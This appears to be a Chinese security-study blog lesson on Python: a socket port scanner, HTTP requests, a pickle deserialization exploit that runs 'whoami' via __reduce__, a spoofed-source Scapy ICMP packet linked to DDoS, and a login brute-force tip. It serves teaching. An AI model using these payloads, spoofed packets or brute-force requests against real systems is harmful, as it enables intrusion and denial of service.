---
title: Day019：操作系统与脚本 - Python 安全编程基础
tags:
  - 网络
  - 安全
  - 学习计划
categories:
  - 网络安全
abbrlink: 5a829
date: 2026-02-10
updated: 2026-02-10
---

# Day019：操作系统与脚本 - Python 安全编程基础

- **日期**：2026-02-10
- **周次**：第 3 周
- **模块**：操作系统与脚本
- **主题**：Python 安全编程基础
- **预计学习时间**：3 小时

---

## 🎯 学习目标

学完今天你应该能做到：

- **工具制造**：不再只做“脚本小子”，能自己写一个简单的端口扫描器。
- **协议交互**：用 Python 发送 HTTP 请求，模拟浏览器登录。
- **漏洞原理**：亲手复现 Python 著名的 Pickle 反序列化漏洞。

<!--more-->

## 📚 完整学习内容（必读）

### 一、概念理解：为什么是 Python？

在网络安全领域，Python 是当之无愧的王者。
- **库多**：你想干的任何事（爆破、扫描、抓包），都有现成的库。
- **简单**：写 C 语言要 100 行的代码，Python 可能只要 10 行。

### 二、原理讲解：Socket 编程

所有网络通信的底层都是 Socket（套接字）。
就像打电话一样：
1.  **服务器**：买个手机（创建 Socket），插卡（绑定 IP/Port），等电话（监听 Listen）。
2.  **客户端**：买个手机，拨号（连接 Connect）。

Python 的 `socket` 库让这一切变得极简。

### 三、技术细节：实战代码

#### 1. 写一个端口扫描器 (Port Scanner)
原理：尝试连接目标 IP 的特定端口，如果连接成功，说明端口开放。

```python
import socket

target_ip = "127.0.0.1"
port = 80

# 创建 socket 对象 (IPv4, TCP)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.settimeout(1)  # 设置超时时间，别傻等

# 尝试连接
result = client.connect_ex((target_ip, port))

if result == 0:
    print(f"端口 {port} 开放")
else:
    print(f"端口 {port} 关闭")

client.close()
```

#### 2. 发送 HTTP 请求 (Requests)
不要用 Socket 去手写 HTTP 协议（太累了），用 `requests` 库。

```python
import requests

# 像浏览器一样访问百度
response = requests.get("http://www.baidu.com")

print(response.status_code)  # 打印状态码 (200)
print(response.headers)      # 打印响应头 (Server: BWS/1.1)
```

#### 3. 安全隐患：Pickle 反序列化
Python 的 `pickle` 库可以将对象保存成文件（序列化），读取时再还原（反序列化）。
**危险**：如果黑客修改了文件内容，在反序列化时可以让 Python 执行任意命令！

```python
import pickle
import os

class Evil:
    def __reduce__(self):
        # 当被反序列化时，执行 whoami 命令
        return (os.system, ('whoami',))

# 生成恶意数据
malicious_data = pickle.dumps(Evil())
# print(malicious_data) -> 黑客把这段数据发给你

# 受害者加载数据
pickle.loads(malicious_data)  # 砰！命令执行了
```

### 四、进阶知识：Scapy

`scapy` 是 Python 的神级网络库。它能让你像搭积木一样构造任意数据包。
比如，构造一个伪造源 IP 的 Ping 包：
`send(IP(src="1.1.1.1", dst="192.168.1.1")/ICMP())`
这在 DDoS 攻击和高级扫描中非常常见。

### 五、本日知识点速查表

| 序号 | 核心概念 | 关键点 | 备注 |
|------|----------|--------|------|
| 1 | **Socket** | `AF_INET, SOCK_STREAM` | 这里的 TCP 套接字 |
| 2 | **Requests** | `requests.get/post` | 最人性化的 HTTP 库 |
| 3 | **Connect_ex** | 返回 0 表示成功 | 扫描器的核心逻辑 |
| 4 | **Pickle** | `__reduce__` | 反序列化漏洞的魔法函数 |
| 5 | **Scapy** | 数据包构造 | 网络协议分析神器 |

---

## 🔧 实践任务（合法授权范围内）

### 任务 1：你的第一款扫描器

**操作步骤**：
1. 复制上面的“端口扫描器”代码到 `scan.py`。
2. 修改 `target_ip` 为你的虚拟机 IP。
3. 加上一个 `for` 循环，让它扫描 20 到 100 端口。
4. 运行 `python scan.py`，看看能扫出 SSH (22) 或 Web (80) 吗？

### 任务 2：信息搜集小工具

**操作步骤**：
1. 写一个脚本，自动获取某个网站的 `Server` 头信息（看看它用的是 Nginx 还是 Apache）。
   ```python
   import requests
   url = input("请输入网址: ")
   try:
       r = requests.head(url) # 只取头信息，省流量
       print(f"服务器软件: {r.headers.get('Server')}")
   except:
       print("连接失败")
   ```

### 任务 3：体验 Pickle 漏洞

**操作步骤**：
1. 运行上面的 Pickle 恶意代码。
2. 观察控制台是否输出了你的用户名？
3. **思考**：如果这是一个 Web 服务，允许用户上传 pickle 文件，会有什么后果？

---

## 📝 巩固练习

### 练习 1：概念理解
**问**：`socket.connect` 和 `socket.connect_ex` 有什么区别？
**答**：
- `connect`：连接失败会直接**报错 (抛出异常)**，程序会挂掉（除非你用 try...except）。
- `connect_ex`：连接失败会**返回错误码**（如 111），不会报错，更适合写扫描器。

### 练习 2：实操复盘
**问**：我想用 Python 爆破一个登录页面，应该用哪个库？
**答**：`requests`。你可以用 `requests.post(url, data={'user': 'admin', 'pass': '123'})`，然后检查响应内容里有没有“登录成功”字样。

---

## ✅ 学习成果自检

- [ ] 我能写出一个简单的 TCP 客户端。
- [ ] 我理解了为什么不能随便 unpickle 不信任的数据。
- [ ] 我会用 requests 库发送 GET 请求。

---

> 💬 **老师寄语**：
> 恭喜你，你已经从“工具使用者”进化到了“工具制造者”。虽然这个扫描器很简单，但 Nmap 的核心原理也不过如此。明天，我们将学习处理文本的神器 —— **正则表达式**。
